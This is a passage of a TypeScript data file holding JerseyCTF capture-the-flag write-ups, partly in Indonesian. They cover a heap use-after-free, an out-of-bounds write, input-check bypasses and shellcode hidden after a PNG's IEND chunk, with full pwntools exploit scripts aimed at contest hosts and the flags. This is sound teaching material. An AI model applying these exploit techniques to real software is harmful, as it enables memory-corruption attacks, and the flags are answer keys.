import type { WriteUp } from "../types";

export const jerseyctfWriteups: WriteUp[] = [
  {
    "id": "18",
    "title": "RogueCart",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-03-15",
    "author": "CTF Team",
    "ctfName": "JerseyCTF",
    "description": "Heap exploitation challenge involving use-after-free vulnerability and pointer hijacking to leak flag from protected memory region.",
    "problemDescription": "A rescue shuttle has drifted off-course, and its onboard maintenance systems are behaving strangely. The control interface still responds, but corrupted diagnostics suggest the distress relay is pointing somewhere it shouldn't. You've gained access to the shuttle's recovery console. Analyze the binary, manipulate the maintenance systems, and recover whatever message is buried in the wreckage before the link dies.",
    "tools": [
      "checksec",
      "file",
      "strings",
      "nm",
      "objdump",
      "pwntools",
      "gdb"
    ],
    "analysis": "RogueCart is a binary exploitation challenge involving 3 interconnected vulnerabilities:\n\n1. **Use-After-Free (UAF)**: The servicePanel() function frees the serviceShuttle object but fails to null the global pointer, leaving a dangling pointer that remains accessible.\n\n2. **Type/State Confusion via Reallocation**: The memory chunk freed from serviceShuttle is reused by maintenanceBlob because both have identical size (0x40) and tcache uses LIFO. Attacker input can overwrite fields of the old object.\n\n3. **Trusted Pointer Dereference**: The puts(serviceShuttle->relay) function uses a pointer that has been overwritten by the attacker without any validation.\n\n4. **Information Leak**: The program outputs the heap address of serviceShuttle at startup via [ SHUTTLE HANDLE: 0x... ], allowing the attacker to calculate the exact offset to vaultChunk where the flag is stored.",
    "solution": [
      {
        "title": "Step 1: Enumerate Binary Properties",
        "content": "Use checksec and file to understand the binary's protections and architecture. The binary is a 64-bit ELF, dynamically linked without PIE, but with Stack Canary and NX enabled."
      },
      {
        "title": "Step 2: Observe Program Behavior",
        "content": "Run the binary and identify the interactive menu. The program displays a heap pointer leak at startup ([ SHUTTLE HANDLE: 0x... ]) which is the address of the serviceShuttle object.",
        "code": "1. Jettison shuttle\n2. Load maintenance blob\n3. Broadcast distress relay\n4. Exit"
      },
      {
        "title": "Step 3: Map Heap Layout",
        "content": "Analyze the primeShuttle() function to understand the allocation order. All allocations have size 0x40 bytes, meaning the glibc chunk stride is 0x50. The vaultChunk (containing the flag) is allocated 3 chunks before serviceShuttle.",
        "code": "Allocation order:\nvaultChunk (0x40) - heap offset 0x00\nspacerA (0x40) - heap offset 0x50\nspacerB (0x40) - heap offset 0xA0\nserviceShuttle (0x40) - heap offset 0xF0\nserviceShuttle->relay (0x40) - heap offset 0x140\n\nOffset formula:\nvaultChunk = shuttle_handle - 3*0x50 = shuttle_handle - 0xF0"
      },
      {
        "title": "Step 4: Analyze Vulnerability Chain",
        "content": "Menu option 1 calls free(serviceShuttle) but fails to null the global pointer. Menu option 2 performs malloc(0x40) for maintenanceBlob which will reuse the same chunk (tcache LIFO). The attacker's input can overwrite the pointer field at offset 0x20 (relay pointer)."
      },
      {
        "title": "Step 5: Craft Exploitation Payload",
        "content": "The payload must be 64 bytes with a pointer hijack at offset 0x20. This pointer is overwritten with vaultChunk's address so that puts(serviceShuttle->relay) prints the flag contents.",
        "code": "payload = b'A' * 0x20 + p64(vaultChunk)\npayload = payload.ljust(0x40, b'B')\n\nNote: Little-endian byte order matters for 64-bit pointers"
      },
      {
        "title": "Step 6: Execute Attack",
        "content": "Execution sequence:\n1. Read the leaked pointer from initial output\n2. Calculate vaultChunk = shuttle_handle - 0xF0\n3. Send menu option 1 (free serviceShuttle)\n4. Send menu option 2 with payload containing the pointer hijack\n5. Send menu option 3 to print distress relay (now pointing to vaultChunk with the flag)"
      },
      {
        "title": "Complete Exploit Script",
        "content": "Full working solver combining all stages:",
        "code": "#!/usr/bin/env python3\nfrom pwn import *\n\nBIN_PATH = './roguecart'\nHOST = 'roguecart.aws.jerseyctf.com'\nPORT = 1337\n\ncontext.binary = BIN_PATH\n\n\ndef start(local=False):\n    if local:\n        return process(BIN_PATH)\n    return remote(HOST, PORT)\n\n\ndef choose(io, n):\n    io.sendlineafter(b'> ', str(n).encode())\n\n\ndef exploit(io):\n    # Step 1: Read heap pointer leak\n    io.recvuntil(b'[ SHUTTLE HANDLE: ')\n    shuttle_handle = int(io.recvuntil(b']', drop=True), 16)\n    print(f\"[*] Leak: serviceShuttle @ {hex(shuttle_handle)}\")\n\n    # Step 2: Calculate vaultChunk offset\n    # Heap layout from allocation order in primeShuttle():\n    # vaultChunk, spacerA, spacerB, serviceShuttle, serviceShuttle->relay\n    # Each user allocation is 0x40 bytes, glibc chunk stride is 0x50.\n    # So vaultChunk is 3 chunks before serviceShuttle.\n    vault_chunk = shuttle_handle - (3 * 0x50)\n    print(f\"[*] Calculated vaultChunk @ {hex(vault_chunk)}\")\n\n    # Step 3: Free serviceShuttle (dangling global pointer remains)\n    print(\"[*] Menu 1: Free serviceShuttle\")\n    choose(io, 1)\n\n    # Step 4: Allocate maintenanceBlob size 0x40\n    # This reuses the freed serviceShuttle chunk (tcache LIFO)\n    print(\"[*] Menu 2: Reallocate + Overwrite relay pointer\")\n    choose(io, 2)\n    io.recvuntil(b'[ FEED 64 BYTES OF PATCH DATA ]\\n')\n\n    # Step 5: Craft payload\n    # Overwrite serviceShuttle->relay pointer at offset 0x20 with vaultChunk\n    # This makes puts(serviceShuttle->relay) print the flag from vaultChunk\n    payload = b'A' * 0x20 + p64(vault_chunk)\n    payload = payload.ljust(0x40, b'B')\n    io.send(payload)\n    print(f\"[*] Payload sent: {len(payload)} bytes\")\n\n    # Step 6: Print relay (now points to vaultChunk containing flag)\n    print(\"[*] Menu 3: Print hijacked relay (points to vaultChunk)\")\n    choose(io, 3)\n    io.recvuntil(b'[ DISTRESS RELAY ]\\n')\n    flag = io.recvline().strip().decode(errors='ignore')\n    print(f\"[+] FLAG CAPTURED: {flag}\")\n    return flag\n\n\nif __name__ == '__main__':\n    io = start(local=args.LOCAL)\n    flag = exploit(io)\n    io.close()\n    print(f\"\\n[!] Final Flag: {flag}\")"
      }
    ],
    "terminalOutputs": [
      {
        "command": "checksec --file=roguecart",
        "output": "[*] '/path/to/roguecart'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE"
      },
      {
        "command": "python3 exploit.py",
        "output": "[*] Connecting to remote...\n[*] Leak: serviceShuttle @ 0x561e25c62310\n[*] Calculated vaultChunk @ 0x561e25c621c0\n[*] Executing UAF chain...\n[*] Menu 1: Free serviceShuttle\n[*] Menu 2: Reallocate + Overwrite relay pointer\n[*] Menu 3: Print hijacked relay (points to vaultChunk)\n[ DISTRESS RELAY ]\njctf{r09U3_cART_hE4p_H!j4Ck}\n[+] Flag captured!"
      }
    ],
    "flag": "jctf{r09U3_cART_hE4p_H!j4Ck}",
    "lessonsLearned": "**Always Null Pointers After Free**: After freeing memory, set the pointer to NULL immediately. Leaving dangling pointers is a critical mistake that enables UAF attacks. ALWAYS null after free().\n\n**Same-Size Allocations Enable Reuse**: When two objects are allocated with identical sizes, tcache immediately reuses freed chunks. This is the foundation for hijacking pointer fields in heap exploitation.\n\n**Missing Pointer Validation**: The object lacks magic numbers or version fields for pre-dereference validation. Trusted pointer dereference without checks is a critical vulnerability.\n\n**Information Leaks Break ASLR**: Leaking heap object addresses removes uncertainty about heap layout. Without leaks, attackers can only guess relative offsets.\n\n**Understand Heap Stride Calculations**: Understanding glibc's allocation strategy (0x40 user size → 0x50 stride) allows attackers to calculate inter-chunk offsets precisely. Reverse-engineer heap layout carefully.\n\n**Little-Endian Byte Order Matters**: When writing 64-bit pointers, byte order is critical. Use helper functions like p64() from pwntools to avoid manual encoding errors.\n\n**Lifecycle Enforcement is Essential**: The application doesn't validate that objects remain valid before using them in different menu branches. Implement proper state machines for object lifecycle management.\n\n**Partial Protections Are Insufficient**: While Canary and NX are present, full ASLR is not enabled (No PIE). Combining information leaks with UAF remains extremely powerful despite partial protections."
  },
  {
    "id": "19",
    "title": "Shall We Play a Game?",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-03-10",
    "author": "CTF Team",
    "ctfName": "JerseyCTF",
    "description": "Tic-tac-toe arcade game with hidden shellcode embedded in PNG file. Challenge involves extracting dual payload blobs from sprite configuration and decoding steganographic data.",
    "problemDescription": "A suspicious arcade game was left by the original developer on the system. It runs a simple tic-tac-toe game, but something feels off. After analyzing the binary, you discover it intentionally executes hidden code at game end. The developer left hints about sprite rendering (SPRT) and the PNG file is larger than expected. Dig into the binary, extract the hidden payload descriptors, and flip the right switch to find the real flag.",
    "tools": [
      "checksec",
      "file",
      "nm",
      "strings",
      "objdump",
      "Python",
      "struct module",
      "regex"
    ],
    "analysis": "This challenge combines several steganographic and binary analysis techniques:\n\n1. **Hidden Code Execution Path**: The render_board_optimized function intentionally maps RWX memory pages and executes bytecode extracted from the PNG file data. This is not a vulnerability in the traditional sense but rather intentional obfuscation.\n\n2. **Dual Payload Mechanism**: The sprite_config structure in the binary's .rodata section stores 8 chunk descriptors (offset, size pairs). The first 4 descriptors point to a decoy payload that prints the fake 'pwned' message. The second 4 descriptors point to the real hidden flag payload.\n\n3. **Steganographic Asset Storage**: Malicious payload bytes are stored in the PNG file's trailing data after the IEND chunk. This is technically valid PNG format since data after IEND is ignored by PNG readers but preserved in the file.\n\n4. **XOR Encryption**: The actual messages within the shellcode blobs are XOR-encrypted with key 0x80. Each payload blob has a 0x35 byte shellcode prologue followed by encrypted message text at offset 0x35.\n\n5. **SPRT Magic**: The sprite_config structure begins with 'SPRT' magic bytes (0x53, 0x50, 0x52, 0x54) followed by version, count, reserved fields, then 8 entries of (offset, size) pairs.",
    "solution": [
      {
        "title": "Step 1: Inspect Binary and Identify Mitigations",
        "content": "Use checksec and file to identify protections. The binary is PIE with NX enabled but no stack canary. The binary is not stripped, making function symbols visible for analysis."
      },
      {
        "title": "Step 2: Locate Hidden Execution Path",
        "content": "Reverse the render_board_optimized function in the binary. Key operations:\n1. Open board.png\n2. Read chunks from PNG using sprite_config descriptors\n3. Allocate RWX memory with mmap(PROT_READ|PROT_WRITE|PROT_EXEC)\n4. Copy blob bytes into RWX page\n5. Execute blob with call rbx"
      },
      {
        "title": "Step 3: Find SPRT Sprite Configuration",
        "content": "Search the .rodata section for the SPRT magic bytes. This structure contains:\n- Magic: 'SPRT' (4 bytes)\n- Version: 0x01000000 in little-endian\n- Count: number of entries (8 in this case)\n- Reserved: padding\n- Entries: 8 pairs of (offset, size) in little-endian 32-bit values"
      },
      {
        "title": "Step 4: Extract Descriptor Pairs",
        "content": "Parse the 8 (offset, size) pairs from sprite_config:\n- Entries 0-3: Decoy payload descriptors\n- Entries 4-7: Real flag payload descriptors\n\nEach entry points to a location in board.png where shellcode blob data is stored."
      },
      {
        "title": "Step 5: Read PNG Trailing Data",
        "content": "The board.png file contains a valid PNG image followed by custom payload data after the IEND chunk. Use the descriptors to extract specific byte ranges from the file at the specified offsets with specified sizes."
      },
      {
        "title": "Step 6: Decode Shellcode Blobs",
        "content": "Each blob has structure:\n- Bytes 0x00-0x34: x86_64 shellcode prologue\n- Bytes 0x35+: XOR-encrypted message (each byte XOR 0x80)\n\nDecode by: message = bytes(b ^ 0x80 for b in blob[0x35:])"
      },
      {
        "title": "Complete Solver Script",
        "content": "Full Python script to extract and decode both payloads:",
        "code": "#!/usr/bin/env python3\nfrom pathlib import Path\nimport re\nimport struct\n\nBIN_PATH = Path('tictactoe')\nPNG_PATH = Path('board.png')\n\n\ndef extract_sprite_entries(binary: bytes):\n    \"\"\"\n    Parse sprite_config from the embedded rodata pattern:\n    b'SPRT' + ver + count + reserved + 8*(off,size)\n    \"\"\"\n    m = re.search(b'SPRT\\x01\\x00\\x00\\x00', binary)\n    if not m:\n        raise RuntimeError('sprite_config magic not found in binary')\n\n    base = m.start()\n    magic, ver, count, reserved = struct.unpack_from('<4sIII', binary, base)\n    if magic != b'SPRT':\n        raise RuntimeError('invalid sprite_config magic')\n\n    entries = []\n    off = base + 16\n\n    # There are two descriptor sets in this challenge asset:\n    # 4 entries (decoy) + 4 entries (real flag payload)\n    for i in range(8):\n        chunk_off, chunk_size = struct.unpack_from('<II', binary, off + i * 8)\n        entries.append((chunk_off, chunk_size))\n\n    return {\n        'base': base,\n        'version': ver,\n        'count': count,\n        'reserved': reserved,\n        'entries': entries,\n    }\n\n\ndef decode_shell_blob(blob: bytes) -> str:\n    \"\"\"\n    Payload format:\n      - x86_64 shellcode prologue (0x35 bytes)\n      - encrypted message, each byte XOR 0x80\n    \"\"\"\n    if len(blob) <= 0x35:\n        return ''\n    msg = bytes(b ^ 0x80 for b in blob[0x35:])\n    return msg.decode('latin1', errors='ignore')\n\n\ndef main():\n    binary = BIN_PATH.read_bytes()\n    png = PNG_PATH.read_bytes()\n\n    print('[*] Loading binary and PNG file...')\n    sc = extract_sprite_entries(binary)\n    entries = sc['entries']\n    \n    print(f'[+] sprite_config found at offset: {hex(sc[\"base\"])}')\n    print(f'[+] version: {sc[\"version\"]}, count: {sc[\"count\"]}')\n    print(f'[+] Found {len(entries)} descriptor entries')\n    print()\n\n    # Extract the two payload blobs\n    decoy_blob = b''.join(png[o:o + s] for (o, s) in entries[:4])\n    flag_blob = b''.join(png[o:o + s] for (o, s) in entries[4:8])\n\n    print(f'[*] Decoy blob size: {len(decoy_blob)} bytes')\n    print(f'[*] Flag blob size: {len(flag_blob)} bytes')\n    print()\n\n    # Decode the messages\n    decoy_text = decode_shell_blob(decoy_blob)\n    flag_text = decode_shell_blob(flag_blob)\n\n    print('[*] === DECOY PAYLOAD ===')\n    print(decoy_text.strip() or '<empty>')\n    print()\n    print('[*] === HIDDEN PAYLOAD ===')\n    print(flag_text.strip() or '<empty>')\n    print()\n\n    # Extract flag\n    m = re.search(r'jctf\\{[^}]+\\}', flag_text)\n    if not m:\n        raise RuntimeError('flag pattern not found')\n\n    flag = m.group(0)\n    print(f'[+] FLAG: {flag}')\n    return flag\n\n\nif __name__ == '__main__':\n    main()"
      }
    ],
    "terminalOutputs": [
      {
        "command": "checksec --file=tictactoe",
        "output": "[*] '/path/to/tictactoe'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled"
      },
      {
        "command": "python3 solver.py",
        "output": "[*] Loading binary and PNG file...\n[+] sprite_config found at offset: 0x5a60\n[+] version: 1, count: 8\n[+] Found 8 descriptor entries\n\n[*] Decoy blob size: 256 bytes\n[*] Flag blob size: 256 bytes\n\n[*] === DECOY PAYLOAD ===\n[!] Oh no, you've been pwned!\n[!] This system has been compromised.\n\n[*] === HIDDEN PAYLOAD ===\n[*] jctf{6r3371N65_Pr0F3550r_F41K3N}\n\n[+] FLAG: jctf{6r3371N65_Pr0F3550r_F41K3N}"
      }
    ],
    "flag": "jctf{6r3371N65_Pr0F3550r_F41K3N}",
    "lessonsLearned": "**Steganography in Legitimate Formats**: PNG and other container formats allow data after official end markers (IEND for PNG). This provides a convenient hiding place for malicious data while keeping the file format-compliant.\n\n**RWX Memory Execution is Dangerous**: Mapping memory as both writable and executable defeats the purpose of NX protection. Avoid mmap(PROT_EXEC|PROT_WRITE) unless absolutely necessary, and validate source data strictly.\n\n**Magic Bytes Enable Parsing**: The 'SPRT' magic marker makes the sprite_config structure easy to locate and parse. Always use magic bytes and versioning for data structures to enable robust parsing.\n\n**Dual Payload Pattern for Obfuscation**: Storing decoy and real payloads side-by-side confuses analysts. Implement integrity checks and use signed/authenticated data structures.\n\n**Symbol Stripping is Critical**: The binary was not stripped, making function names visible. Always strip release binaries and use symbol encryption for sensitive code paths.\n\n**Simple XOR is Not Encryption**: XOR with a fixed key (0x80) provides zero real security. Use proper cryptographic algorithms if confidentiality is a goal.\n\n**Binary Analysis Requires Multiple Tools**: Understanding this challenge required checksec, file, nm, strings, objdump, and custom Python parsing. Comprehensive tooling and methodical analysis is essential.\n\n**File Format Knowledge Matters**: Understanding PNG structure (chunks, IEND marker) was crucial to realize where the payload data was hidden. Deep knowledge of formats used in your system is valuable for security analysis."
  },
  {
    "id": "jerseyctf-bin-abort",
    "title": "- Abort (JerseyCTF, PWN)",
    "category": "Bin",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "Challenge ini kelihatannya seperti challenge BOF biasa karena ada `read()`, tapi ternyata yang menarik justru ada di validasi logic input, bukan di overflow.",
    "problemDescription": "Challenge ini kelihatannya seperti challenge BOF biasa karena ada `read()`, tapi ternyata yang menarik justru ada di validasi logic input, bukan di overflow.",
    "tools": [],
    "analysis": "Potongan penting:\n- Alokasi stack 0x50 byte\n- `memset(buf, 0, 0x50)`\n- `read(0, buf, 0x50)`\n\nValidasi setelah input:\n1. `*(uint32_t*)(buf+0x40)` masuk ke fungsi `0x401216`, hasilnya harus `0x5a7eab95`\n2. `*(uint32_t*)(buf+0x44)` masuk ke fungsi `0x401230`, hasilnya harus `0x6fa08e7e`\n3. `buf+0x48` dicek oleh fungsi `0x40124a` (6-byte check dengan XOR)\n\nKalau semua lolos, dipanggil fungsi sukses (`0x401323`) yang akhirnya manggil:\n\n`system(\"cat flag.txt\")`",
    "solution": [
      {
        "title": "1) Initial Recon",
        "content": "Binary info:\n- 64-bit ELF, stripped\n- No PIE\n- NX enabled\n- No canary\n- Partial RELRO\n\n`checksec` bikin saya awalnya curiga ke ret2win/ROP, tapi setelah lihat ukuran `read`, ternyata tidak ada overwrite RIP."
      },
      {
        "title": "2) Reverse dari Entry Point",
        "content": "Hint challenge benar: mulai dari entry point.\n\n- Entry ada di `0x401130`.\n- Register `rdi` untuk `__libc_start_main` diisi `0x401460`, jadi itu fungsi `main`.\n\nDi `0x401460`:\n- Set `signal(SIGALRM, handler)`\n- `alarm(0x78)` (120 detik)\n- Panggil fungsi utama logic di `0x401365`"
      },
      {
        "title": "Check 1 (`0x401216`)",
        "content": "Rumus fungsi:\n\n`f1(x) = (x ^ 0x4b1d3f29) - 0x6e58d392`\n\nSyarat:\n\n`f1(x) == 0x5a7eab95`\n\nMaka:\n\n`x = (0x5a7eab95 + 0x6e58d392) ^ 0x4b1d3f29 = 0x83ca400e`"
      },
      {
        "title": "Check 2 (`0x401230`)",
        "content": "Rumus fungsi:\n\n`f2(y) = (y - 0x6bdad9ef) ^ 0x6f6f6f6f`\n\nSyarat:\n\n`f2(y) == 0x6fa08e7e`\n\nMaka:\n\n`y = (0x6fa08e7e ^ 0x6f6f6f6f) + 0x6bdad9ef = 0x6caabb00`"
      },
      {
        "title": "Check 3 (`0x40124a`)",
        "content": "Fungsi compare 6 byte input dengan byte target yang sudah di-hardcode, setelah tiap byte input di-XOR `0x5c`.\nTarget bytes yang dibandingkan:\n\n`3d 2e 3f 3d 38 39`\n\nJadi input 6 byte yang benar:\n\n`target ^ 0x5c` -> `b\"arcade\"`\n\nTambahan penting: setelah 6 byte itu, byte berikutnya harus `\\x00`.\nKarena buffer di-`memset(0)` dulu, cukup kirim payload tanpa newline berlebih supaya byte sesudah `arcade` tetap nol."
      },
      {
        "title": "5) Payload Final",
        "content": "Layout payload:\n- `0x40` byte padding\n- `p32(0x83ca400e)`\n- `p32(0x6caabb00)`\n- `b\"arcade\"`\n\nTotal panjang: `0x4e` byte (78 byte)\n\nKenapa bukan `sendline`?\n- Kalau pakai newline, ada risiko `\\n` masuk ke byte setelah `arcade` yang harusnya `\\x00`, check bisa gagal."
      },
      {
        "title": "6) Exploit Script",
        "content": "Script otomatis ada di:\n- `exploit.py`\n\nMode pakai:\n- Local: `python3 exploit.py --local`\n- Remote: `python3 exploit.py`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport argparse\r\nimport struct\r\n\r\ncontext.binary = ELF('./abort', checksec=False)\r\ncontext.log_level = 'info'\r\n\r\nHOST = 'abort.aws.jerseyctf.com'\r\nPORT = 1337\r\n\r\n# Solved constants from reversing:\r\n# f1(x) = (x ^ 0x4b1d3f29) - 0x6e58d392 == 0x5a7eab95\r\n# f2(y) = (y - 0x6bdad9ef) ^ 0x6f6f6f6f == 0x6fa08e7e\r\nV1 = 0x83CA400E\r\nV2 = 0x6CAABB00\r\nTAIL = b'arcade'  # checked via per-byte xor with 0x5c\r\n\r\n\r\ndef build_payload() -> bytes:\r\n    return b'A' * 0x40 + struct.pack('<I', V1) + struct.pack('<I', V2) + TAIL\r\n\r\n\r\ndef start(local: bool):\r\n    if local:\r\n        return process('./abort')\r\n    return remote(HOST, PORT)\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description='Exploit for JerseyCTF Abort')\r\n    parser.add_argument('--local', action='store_true', help='run locally')\r\n    args = parser.parse_args()\r\n\r\n    io = start(args.local)\r\n    payload = build_payload()\r\n\r\n    # Do not use sendline; newline can overwrite byte that must stay NULL.\r\n    io.send(payload)\r\n    data = io.recvrepeat(2)\r\n    if data:\r\n        print(data.decode('latin-1', errors='ignore'))\r\n    io.close()\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{$UccES5Fully_abOrt3D!_cOnGRATUl@t!0ns}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-bin-gatekeeper",
    "title": "CTF — Gatekeeper",
    "category": "Bin",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** PWN / Binary Exploitation  \n**Difficulty:** Easy  \n**Flag:** `JCTF{N3PTUN3_G4T3_AUTH0R1Z3D}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | **Out-of-Bounds Write** | `cmd_update` tidak cek batas bawah index (`idx < 0`) |\n| 2 | **Negative Index Abuse** | `update -1 ...` menulis ke entri sebelum index 0 yang dipakai command logic Neptune |\n| 3 | **Data-Only Exploit** | Tidak perlu hijack RIP/ROP, cukup ubah data `valid` dan `clearance` |\n\n---",
    "tools": [
      "file",
      "nc",
      "Python +"
    ],
    "analysis": "```bash\nfile gatekeeper_offline\n\nchecksec --file=gatekeeper_offline\n```\n\nKarena binary **not stripped**, symbol penting langsung kelihatan (`cmd_status`, `cmd_revoke`, `cmd_update`, `init_db`).",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> A degraded certificate authority once managed planetary gate transit across Orion's inner routes. Neptune remains locked, and only legacy certificates seem to matter now. Find a way to authorize Neptune transit and restore the first hop in the surviving gate chain.\n\n**Files:** `gatekeeper_offline`, `README.txt`, `gate_route_notice.txt`  \n**Remote:** `nc gatekeeper.aws.jerseyctf.com 31337`\n\n---"
      },
      {
        "title": "Step 2 — Program Behavior",
        "content": "Command yang tersedia:\n- `status <CERT_ID>`\n- `revoke <INDEX>`\n- `update <INDEX> <VALID> <CLEARANCE>`\n\nTujuan challenge dari deskripsi: unlock Neptune transit.",
        "code": "./gatekeeper_offline"
      },
      {
        "title": "Step 3 — Locate Sensitive Logic",
        "content": "Dari disassembly `cmd_status`, kondisi Neptune untuk print flag adalah:\n- `valid == 1`\n- `clearance > 4`\n\nCert Neptune adalah `NEPT-1070`.\n\n---"
      },
      {
        "title": "Step 4 — Vulnerability Discovery",
        "content": "Analisis fungsi `cmd_update` menunjukkan validasi index cacat:\n\n- Ada cek `if idx > 3` → DENIED\n- **Tidak ada cek `idx < 0`**\n\nArtinya index negatif lolos dan akan dipakai dalam aritmetika offset struct array (out-of-bounds write)."
      },
      {
        "title": "Step 5 — Primitive Validation (Local)",
        "content": "Hasil:\n- sebelum exploit: `valid=0 clearance=5`\n- setelah exploit: `valid=1 clearance=9`\n- kondisi gate terpenuhi, offline binary menampilkan fake flag\n\nJadi `update -1 1 9` sukses overwrite field Neptune dengan teknik negative index.",
        "code": "printf 'status NEPT-1070\\nupdate -1 1 9\\nstatus NEPT-1070\\n' | ./gatekeeper_offline"
      },
      {
        "title": "Step 6 — Trigger on Remote",
        "content": "Output remote mengembalikan flag live.\n\n---",
        "code": "printf 'update -1 1 9\\nstatus NEPT-1070\\n' | nc gatekeeper.aws.jerseyctf.com 31337"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "Command parser (update)\n      │\n      ▼\nMissing lower-bound check on index\n      │\n      ▼\nupdate -1 1 9\n      │\n      ▼\nOverwrite Neptune state (valid=1, clearance=9)\n      │\n      ▼\nstatus NEPT-1070\n      │\n      ▼\nCondition satisfied in cmd_status\n      │\n      ▼\nJCTF{N3PTUN3_G4T3_AUTH0R1Z3D}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport re\r\n\r\nHOST = \"gatekeeper.aws.jerseyctf.com\"\r\nPORT = 31337\r\nBINARY = \"./gatekeeper_offline\"\r\n\r\ncontext.binary = ELF(BINARY, checksec=False)\r\ncontext.log_level = \"info\"\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n    return process(BINARY)\r\n\r\n\r\ndef cmd(io, line: str):\r\n    io.sendlineafter(b\"gatekeeper> \", line.encode())\r\n\r\n\r\ndef main():\r\n    io = start()\r\n\r\n    # Bug: cmd_update hanya cek index <= 3, tidak cek index < 0.\r\n    # index = -1 menulis ke entri Neptune (sebelum DB[1]).\r\n    cmd(io, \"update -1 1 9\")\r\n    cmd(io, \"status NEPT-1070\")\r\n\r\n    out = io.recvrepeat(1.0)\r\n    text = out.decode(\"utf-8\", errors=\"ignore\")\r\n    print(text, end=\"\")\r\n\r\n    m = re.search(r\"JCTF\\{[^}]+\\}\", text)\r\n    if m:\r\n        log.success(f\"FLAG: {m.group(0)}\")\r\n    else:\r\n        log.warning(\"Flag belum ditemukan di output.\")\r\n\r\n    io.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "JCTF{N3PTUN3_G4T3_AUTH0R1Z3D}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-bin-roguecart",
    "title": "CTF — RogueCart",
    "category": "Bin",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Pwn  \n**Difficulty:** Medium  \n**Flag:** `jctf{r09U3_cART_hE4p_H!j4Ck}`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **Use-After-Free (UAF)** | `serviceShuttle` di-free tapi pointer global tetap dipakai |\n| 2 | **Type/State Confusion via Reallocation** | `maintenanceBlob` reuse chunk freed `serviceShuttle` (size sama, tcache) |\n| 3 | **Trusted Pointer Dereference** | `puts(serviceShuttle->relay)` memakai pointer yang bisa dioverwrite attacker |\n| 4 | **Info Leak** | Program leak alamat `serviceShuttle` via `%p`, mempermudah hitung `vaultChunk` |\n\n---",
    "tools": [
      "checksec",
      "pwntools",
      "nc"
    ],
    "analysis": "Pertama cek properti binary:\n\n```bash\nfile roguecart\nchecksec --file=roguecart\n```\n\nHasil penting:\n- ELF 64-bit, dynamically linked, **No PIE**\n- **Canary ON**, **NX ON**, Partial RELRO\n- Simbol tidak di-strip (fungsi seperti `servicePanel`, `primeShuttle`, `loadFlag` terlihat)",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> A rescue shuttle has drifted off-course, and its onboard maintenance systems are behaving strangely. The control interface still responds, but corrupted diagnostics suggest the distress relay is pointing somewhere it shouldn’t.\n>\n> You’ve gained access to the shuttle’s recovery console. Analyze the binary, manipulate the maintenance systems, and recover whatever message is buried in the wreckage before the link dies.\n>\n> **Hint:** The input is larger than the visible buffer. Look closely at how adjacent stack fields are validated. Little endian matters.\n\n---"
      },
      {
        "title": "Step 2 — Observe Program Behavior",
        "content": "Jalankan binary dan lihat menu:\n\n\n\nDi awal program ada leak pointer:\n\n\n\nPointer ini ternyata adalah alamat heap object `serviceShuttle`.",
        "code": "1. Jettison shuttle\n2. Load maintenance blob\n3. Broadcast distress relay\n4. Exit"
      },
      {
        "title": "Step 3 — Identify Interesting Routines",
        "content": "Dari disassembly (`objdump -d -M intel roguecart`), fungsi kunci:\n- `loadFlag()` membaca `flag.txt` ke `vaultChunk` (heap)\n- `primeShuttle()` mengatur alokasi heap object\n- `servicePanel()` menangani menu interaktif dan bug utama\n\n---"
      },
      {
        "title": "Step 4 — Analyze Heap Layout",
        "content": "Di `primeShuttle()`, urutan alokasi:\n\n1. `vaultChunk = malloc(0x40)`  \n2. `spacerA = malloc(0x40)`  \n3. `spacerB = malloc(0x40)`  \n4. `serviceShuttle = malloc(0x40)`  \n5. `serviceShuttle->relay = malloc(0x40)` (field pointer di offset `+0x20`)\n\nKarena semua size user `0x40`, stride chunk glibc jadi `0x50`."
      },
      {
        "title": "Step 5 — Find the Primitive (Use-After-Free)",
        "content": "Di `servicePanel()`:\n- Opsi `1` memanggil `free(serviceShuttle)`\n- Tapi pointer global `serviceShuttle` **tidak di-null** (dangling pointer)\n- Opsi `2` melakukan `malloc(0x40)` lagi untuk `maintenanceBlob` lalu `read(0, ..., 0x40)`\n\nKarena tcache LIFO dan size sama, chunk hasil free `serviceShuttle` direuse oleh `maintenanceBlob`. Artinya input opsi `2` bisa menimpa data object `serviceShuttle` lama."
      },
      {
        "title": "Step 7 — Execute Attack",
        "content": "Urutan menu eksploit:\n\n1. `1` (free `serviceShuttle`)  \n2. `2` (alokasi ulang chunk dan kirim payload overwrite)  \n3. `3` (print distress relay yang sekarang menunjuk ke `vaultChunk`)\n\nHasil remote:\n\n\n\n---",
